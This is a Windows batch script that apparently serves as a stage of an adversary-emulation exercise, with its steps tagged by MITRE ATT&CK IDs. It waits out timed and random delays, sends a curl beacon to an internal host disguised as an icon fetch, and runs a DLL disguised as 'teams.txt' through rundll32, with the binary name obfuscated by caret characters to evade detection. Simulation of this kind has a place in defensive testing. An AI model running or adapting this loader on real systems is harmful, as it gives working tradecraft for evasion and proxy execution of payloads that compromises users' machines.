@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET yktnwwf=%APPDATA%\8891\d201b558
SET fpakbq=Macula-Stage0-8891
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8891-10
SET omxgazu=BALAM-S2BO
SET yydue=10
SET edjwtl=teams.txt
SET fpldhe=8891

SET jtadsc=%APPDATA%\!yydue!\macula-simulations.log
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_start>> "!jtadsc!" 2>nul

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_start>> "!jtadsc!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_end>> "!jtadsc!" 2>nul

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start>> "!jtadsc!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
SET tepsv=1
SET yojckh=
IF !ERRORLEVEL! NEQ 0 SET tepsv=0 & SET yojckh=curl_!ERRORLEVEL!
echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!tepsv!:!yojckh!>> "!jtadsc!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_end>> "!jtadsc!" 2>nul

ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_1>> "!jtadsc!" 2>nul

SET /A jhfkld=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: random_delay_!jhfkld!s_start>> "!jtadsc!" 2>nul
timeout /t !jhfkld! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: random_delay_end>> "!jtadsc!" 2>nul

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_start>> "!jtadsc!" 2>nul
cd /d "!yktnwwf!" >nul 2>&1
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_end>> "!jtadsc!" 2>nul

CHOICE /C Y /N /D Y /T 6 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_2>> "!jtadsc!" 2>nul

SET mxdvc=r^u^n^d^l^l^3^2^.^e^x^e
SET kdsjb=D^l^l^M^a^i^n
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_start>> "!jtadsc!" 2>nul
!mxdvc! !edjwtl!,!kdsjb!
SET bvflmk=1
SET pgqzbd=
IF !ERRORLEVEL! NEQ 0 SET bvflmk=0 & SET pgqzbd=rundll_!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_end>> "!jtadsc!" 2>nul
echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218.011|Rundll32=!bvflmk!:!pgqzbd!>> "!jtadsc!" 2>nul

ENDLOCAL